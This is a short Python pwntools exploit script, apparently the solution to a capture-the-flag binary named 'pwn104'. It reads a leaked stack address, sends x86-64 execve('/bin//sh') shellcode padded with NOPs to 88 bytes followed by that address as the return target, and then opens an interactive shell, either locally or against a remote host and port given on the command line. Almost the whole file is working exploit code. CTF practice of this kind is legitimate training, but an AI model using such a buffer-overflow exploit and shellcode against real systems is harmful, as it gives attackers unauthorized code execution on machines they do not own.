#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn104.pwn104'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

# check exploit-db for shellcode https://www.exploit-db.com/exploits/46907
shellcode  = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

io = start()
io.recvuntil(b'at ') #program gives us buffer location, we skip till that part
address = io.recvline() 
bufferLocation = p64(int(address, 16))

exploit  = b''
exploit += shellcode
exploit  += b"\x90"*(88-len(shellcode))
exploit += bufferLocation

io.sendline(exploit)

io.interactive()
